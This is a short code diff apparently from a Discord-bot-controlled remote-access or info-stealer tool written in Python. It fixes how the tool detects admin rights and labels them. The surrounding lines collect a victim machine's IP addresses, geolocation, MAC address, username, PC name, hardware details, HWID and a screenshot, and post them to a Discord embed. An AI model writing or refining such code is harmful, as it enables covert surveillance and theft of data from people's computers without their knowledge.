@@ -260,8 +260,10 @@ async def run(bot):
 
     async def isadmin():
         nonlocal is_admin
-        try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except: pass
+        try:
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            is_admin = False
 
     async def getip():
         nonlocal ipv4, public_ip, ip_geolocation, location, mac_address
@@ -398,7 +400,7 @@ async def run(bot):
     hwwid = procid.strip()
     if screenshot_path and os.path.exists(screenshot_path):
         embed.set_image(url="attachment://screenshot.png")
-        admin_status = "⛔" if is_admin else "🟢"
+        admin_status = "✅" if is_admin else "⛔"
         embed.add_field(name="🔒 Running as Admin:", value=f"{admin_status}", inline=False)
         embed.add_field(name="👤 User:", value=f"```Display Name: {username if username else 'N/A'}\nUsername: {username if username else 'N/A'}\nPCName: {pcname if pcname else 'N/A'}```", inline=False)
         embed.add_field(name="System:", value=f"```CPU: {platform.processor()}\nGPU: {platform.machine()}\nRAM: {ram:.2f} GB\nHWID: {hwwid}```", inline=False)
